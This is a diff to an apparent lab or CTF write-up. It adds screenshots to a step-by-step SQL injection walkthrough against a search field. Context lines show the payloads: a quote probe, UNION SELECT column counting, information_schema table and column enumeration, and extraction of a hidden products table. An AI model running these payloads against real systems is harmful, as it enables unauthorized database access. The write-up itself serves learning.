@@ -119,7 +119,12 @@ Content-Type: application/x-www-form-urlencoded
 search='
 ```
 
+<img width="1274" height="682" alt="Screenshot 2026-09-17 at 2 45 10 PM" src="https://github.com/user-attachments/assets/c93f793b-4000-4aef-8f79-298a17168a91" />
+
+
 ---
+
+
 
 ### Request 2 — Column Count
 
@@ -130,6 +135,9 @@ Content-Type: application/x-www-form-urlencoded
 
 search=' UNION SELECT 1,2,3,4,5 -- //
 ```
+<img width="1276" height="715" alt="Screenshot 2026-09-17 at 2 55 15 PM" src="https://github.com/user-attachments/assets/26135757-2363-4cc5-b305-9b8ae76befff" />
+
+
 
 ---
 
@@ -144,6 +152,10 @@ search=' UNION SELECT 1,2,table_schema,table_name,1
 FROM information_schema.tables -- //
 ```
 
+<img width="1273" height="685" alt="Screenshot 2026-09-17 at 2 57 45 PM" src="https://github.com/user-attachments/assets/4d379a53-df75-43a8-a3ab-287ddf12c6c0" />
+
+
+
 ---
 
 ### Request 4 — Database Structure
@@ -157,6 +169,9 @@ search=' UNION SELECT 1,2,table_schema,table_name,1
 FROM information_schema.columns
 WHERE table_schema=database() -- //
 ```
+
+<img width="1272" height="680" alt="Screenshot 2026-09-17 at 3 00 07 PM" src="https://github.com/user-attachments/assets/e78ec665-f045-498c-9658-c2fba5b20f89" />
+
 
 ---
 
@@ -173,6 +188,10 @@ WHERE table_schema=database()
   AND table_name='unlisted_products' -- //
 ```
 
+<img width="1275" height="716" alt="Screenshot 2026-09-17 at 3 01 34 PM" src="https://github.com/user-attachments/assets/97eac53e-7b77-4975-8e57-f72784bdbc94" />
+
+
+
 ---
 
 ### Request 6 — Extract Data
@@ -185,6 +204,9 @@ Content-Type: application/x-www-form-urlencoded
 search=' UNION SELECT description,id,price,product_name,product_type
 FROM unlisted_products -- //
 ```
+
+<img width="1275" height="648" alt="Screenshot 2026-09-17 at 3 04 07 PM" src="https://github.com/user-attachments/assets/503c466e-49e7-425f-9c98-43017c25bcf0" />
+
 
 ---
 
